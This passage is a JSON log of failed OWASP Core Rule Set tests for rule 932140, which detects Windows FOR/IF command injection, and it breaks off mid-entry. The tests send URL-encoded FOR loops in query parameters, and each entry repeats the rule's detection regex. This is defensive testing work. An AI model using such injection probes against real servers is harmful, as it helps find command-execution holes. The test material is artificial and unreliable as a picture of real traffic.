        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 42,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 42,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FL+%25G+IN+%281%2C1%2C5%29+DO+echo+%25G",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 43,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 43,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FL+%25%25G+IN+%281%2C1%2C5%29+DO+echo+%25%25G",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 44,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 44,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%25G+IN+%28Sun+Mon+Tue+Wed+Thur+Fri+Sat%29+DO+echo+%25G",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 45,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 45,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%25%25G+IN+%28Sun+Mon+Tue+Wed+Thur+Fri+Sat%29+DO+echo+%25%25G",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 46,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920460 - Abnormal character escapes in request", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942340 - Detects basic SQL authentication bypass attempts 3/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character 